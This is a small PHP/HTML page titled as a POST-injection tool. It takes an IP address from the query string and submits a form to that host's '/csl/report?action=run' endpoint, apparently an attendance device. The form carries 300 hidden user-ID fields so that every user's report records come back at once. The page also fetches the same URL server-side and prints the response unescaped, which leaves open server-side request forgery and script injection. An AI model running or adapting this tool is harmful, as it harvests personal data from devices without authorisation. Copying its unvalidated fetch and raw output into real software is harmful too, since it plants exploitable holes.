<!DOCTYPE html>
<html>
<head>
	<title>Inyeccion de POST en CL</title>
</head>
<body>

<?php
require("unica/config.php");
require("unica/funciones.php");



$ip = $_GET['ip'];
$url = 'http://'.$ip.'/csl/report?action=run';
?>

<form name="mainform" method="post" target="nodo" action="<?php echo $url;?>" onsubmit="return uidcheck(document.mainform.uid,&quot;Error Input!&quot;);">

	<input class="inputbox" type="text" size="10" maxlength="10" name="sdate" value="2017-06-26">
	<input class="inputbox" type="text" maxlength="10" size="10" name="edate" value="2017-06-26">


			<select name="period" onchange="OnPeriod(this.value);">
                <option value="0">Define</option>
                <option value="1" selected="">Today</option>
                <option value="2">Yesterday</option>
                <option value="3">Week</option>
                <option value="4">Last Week</option>
                <option value="5">Mon</option>
                <option value="6">Last Mon</option>
            </select>

	<input class="inputbox" type="submit" value="Search">

<?php
$level=300;
for ($i = 1; $i <= $level; $i++) {
    echo '<input checked type="hidden" name="uid" value="'.$i.'">';
}

?>


<iframe name='nodo'>
</iframe>



<hr>

<?php
$página_inicio = file_get_contents($url);

echo "<h1>".$url."</h1>";
echo $página_inicio;

?>
</body>
</html>